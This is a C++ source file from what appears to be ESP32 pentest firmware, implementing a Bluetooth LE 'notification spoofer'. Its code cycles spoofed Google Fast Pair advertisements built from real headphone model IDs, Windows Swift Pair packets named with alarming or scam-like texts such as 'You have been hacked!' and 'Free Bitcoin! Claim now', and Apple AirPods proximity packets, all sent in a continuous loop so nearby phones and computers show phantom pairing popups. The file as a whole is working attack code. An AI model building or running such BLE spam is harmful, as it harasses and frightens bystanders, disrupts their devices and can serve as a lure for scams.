#if !defined(LITE_VERSION)
#include "notif_spoofer.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <NimBLEDevice.h>
#include <WiFi.h>
#include <globals.h>
#include <esp_task_wdt.h>

static const char *NOTIF_MESSAGES[] = {
    "You have been hacked!",
    "Your WiFi password is exposed",
    "Someone is watching you",
    "Security alert: device compromised",
    "Update required: tap here",
    "Free Bitcoin! Claim now",
    "Warning: malware detected",
    "Your location is being shared",
    "Camera access detected",
    "Unauthorized login attempt",
};
static const int NUM_MESSAGES = sizeof(NOTIF_MESSAGES) / sizeof(NOTIF_MESSAGES[0]);

static int notifsSent = 0;
static int notifsFailed = 0;

static void sendSwiftPairSpam(NimBLEAdvertising *adv) {
    NimBLEAdvertisementData advData;

    std::string mfgData;
    mfgData += (char)0x06;
    mfgData += (char)0x00;
    mfgData += (char)0x03;
    mfgData += (char)0x00;

    for (int i = 0; i < 6; i++) {
        mfgData += (char)random(256);
    }

    advData.setManufacturerData(mfgData);
    advData.setName(NOTIF_MESSAGES[random(NUM_MESSAGES)]);
    advData.setFlags(0x06);

    adv->setAdvertisementData(advData);
}

static void sendGoogleFastPair(NimBLEAdvertising *adv) {
    NimBLEAdvertisementData advData;

    // Registered FastPair model IDs. Random bytes rarely trigger a popup
    // because the OS validates the ID against its device database, so cycle
    // a real set instead. Sources: Google FastPair registry + community
    // dumper repos. Mix of earbuds/headphones/trackers.
    static const uint32_t fastpair_models[] = {
        0x00000A, // Bose QuietComfort 35 II
        0x00000B, // Bose QuietComfort 35 II (alt)
        0x00000D, // Bose 700
        0x000047, // Bose SoundLink Mini II
        0x000048, // Bose SoundLink Micro
        0x000007, // JBL Live 220BT
        0x000048, // JBL Live 220BT (alt)
        0x001000, // JBL Tour One
        0x00B727, // JBL Reflect Mini 2
        0x01E5CE, // JBL Free X
        0x0200F0, // Sony WH-1000XM3
        0x00F7D4, // Sony WF-SP700N
        0x090000, // Sony WH-1000XM4
        0x0602F0, // Sony WH-1000XM5
        0x0603F0, // Sony WF-1000XM5
        0x05AA91, // Pixel Buds Pro
        0x05C452, // Pixel Buds A-Series
        0x06C95C, // Pixel Buds Pro 2
        0x04AA91, // Galaxy Buds Live
        0x05A963, // Galaxy Buds Pro
        0x05C95C, // Galaxy Buds 2
        0x06D8FC, // Galaxy Buds 3
        0x0744B6, // Galaxy Buds 3 Pro
        0x06AE20, // JBL Tune 225TWS
        0x06C197, // JBL Tune 130NC
        0x07F426, // Beats Studio Buds
        0x054B2D, // Beats Fit Pro
        0x0660D7, // Beats Studio Pro
        0x0903F0, // Beats Solo 4
        0x1448C9, // JBL Flip 6
        0x13B39D, // JBL Charge 5
        0x77FF67, // Soundcore Liberty 4
        0xAA187F, // Soundcore Liberty Air 2
        0xD99CA1, // Soundcore Motion+
        0x87B25F, // Razer Hammerhead
        0x7C6CDB, // Razer Hammerhead Pro
        0x005EF9, // Sony LinkBuds
        0xE2106F, // Sony LinkBuds S
        0xB37A62, // Bose QuietComfort Earbuds II
        0x92ADC9, // Bose QuietComfort Ultra
    };
    static const int num_models = sizeof(fastpair_models) / sizeof(fastpair_models[0]);
    uint32_t model = fastpair_models[random(num_models)];

    std::string serviceData;
    serviceData += (char)0x2C;
    serviceData += (char)0xFE;
    serviceData += (char)((model >> 0x00) & 0xFF);
    serviceData += (char)((model >> 0x08) & 0xFF);
    serviceData += (char)((model >> 0x10) & 0xFF);

    advData.setServiceData(NimBLEUUID((uint16_t)0xFE2C), serviceData);
    advData.setFlags(0x06);

    adv->setAdvertisementData(advData);
}

static void sendAppleProximityPairing(NimBLEAdvertising *adv) {
    NimBLEAdvertisementData advData;

    std::string mfgData;
    mfgData += (char)0x4C;
    mfgData += (char)0x00;
    mfgData += (char)0x07;
    mfgData += (char)0x19;
    mfgData += (char)0x07;

    static const uint8_t models[][2] = {
        {0x02, 0x20}, // AirPods 1st gen
        {0x0E, 0x20}, // AirPods 2nd gen
        {0x0F, 0x20}, // AirPods 3rd gen
        {0x0A, 0x20}, // AirPods Max
        {0x14, 0x20}, // AirPods Pro 1
        {0x10, 0x20}, // AirPods Pro 2 USB-C
        {0x13, 0x20}, // AirPods Pro 2
        {0x03, 0x20}, // Powerbeats 3
        {0x04, 0x20}, // Powerbeats Pro
        {0x05, 0x20}, // Beats Solo 3
        {0x06, 0x20}, // Beats Solo Pro
        {0x07, 0x20}, // Beats Studio 3
        {0x0B, 0x20}, // Beats Studio Buds
        {0x0C, 0x20}, // Beats Studio Pro
        {0x11, 0x20}, // Beats Fit Pro
        {0x12, 0x20}, // Beats Flex
        {0x17, 0x20}, // Vision Pro
        {0x19, 0x20}, // AirPods 4
    };
    int modelIdx = random(sizeof(models) / sizeof(models[0]));
    mfgData += (char)models[modelIdx][0];
    mfgData += (char)models[modelIdx][1];

    for (int i = 0; i < 22; i++) {
        mfgData += (char)random(256);
    }

    advData.setManufacturerData(mfgData);
    advData.setFlags(0x06);

    adv->setAdvertisementData(advData);
}

void notifSpoofer() {
    notifsSent = 0;
    notifsFailed = 0;

    options.clear();
    int mode = -1;
    options.push_back({"Android (Fast Pair)", [&mode]() { mode = 0; }});
    options.push_back({"Windows (Swift Pair)", [&mode]() { mode = 1; }});
    options.push_back({"iOS (AirPods Popup)", [&mode]() { mode = 3; }});
    options.push_back({"All Platforms", [&mode]() { mode = 2; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "Target Platform");

    if (mode < 0) return;

    NimBLEDevice::deinit(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    if (!NimBLEDevice::init("")) {
        displayError("BLE init failed", true);
        return;
    }
    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();

    unsigned long startTime = millis();

    NimBLEDevice::setSecurityAuth(false, false, false);

    while (true) {
        int sentThisTick = 0;
        if (mode == 0 || (mode == 2 && notifsSent % 3 == 0)) {
            sendGoogleFastPair(pAdvertising);
            sentThisTick++;
        }
        if (mode == 1 || (mode == 2 && notifsSent % 3 == 1)) {
            sendSwiftPairSpam(pAdvertising);
            sentThisTick++;
        }
        if (mode == 3 || (mode == 2 && notifsSent % 3 == 2)) {
            sendAppleProximityPairing(pAdvertising);
            sentThisTick++;
        }

        bool ok = pAdvertising->start();
        if (ok) {
            notifsSent += sentThisTick;
        } else {
            notifsFailed += sentThisTick;
        }
        delay(30);
        pAdvertising->stop();

        if (notifsSent % 10 == 0) {
            drawMainBorderWithTitle("Notif Spoofer");
            int y = 45;
            int padX = 12;

            tft.setTextColor(TFT_MAGENTA, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("SPAMMING NOTIFICATIONS");
            y += 16;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            String modeStr = mode == 0 ? "Android" : mode == 1 ? "Windows" : "All";
            tft.print("Mode: " + modeStr);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Sent: %d  Failed: %d", notifsSent, notifsFailed);
            y += 14;

            unsigned long elapsed = (millis() - startTime) / 1000;
            tft.setCursor(padX, y);
            tft.printf("Elapsed: %lus", elapsed);
            y += 14;

            tft.setCursor(padX, y);
            tft.printf("Rate: ~%d/sec", notifsSent / max(1UL, elapsed));
            y += 18;

            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.print("Nearby devices will see");
            y += 12;
            tft.setCursor(padX, y);
            tft.print("phantom device popups!");

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);
        }

        if (check(EscPress)) break;
        esp_task_wdt_reset();
        delay(10);
    }

    pAdvertising->stop();
    NimBLEDevice::deinit(true);
}
#endif
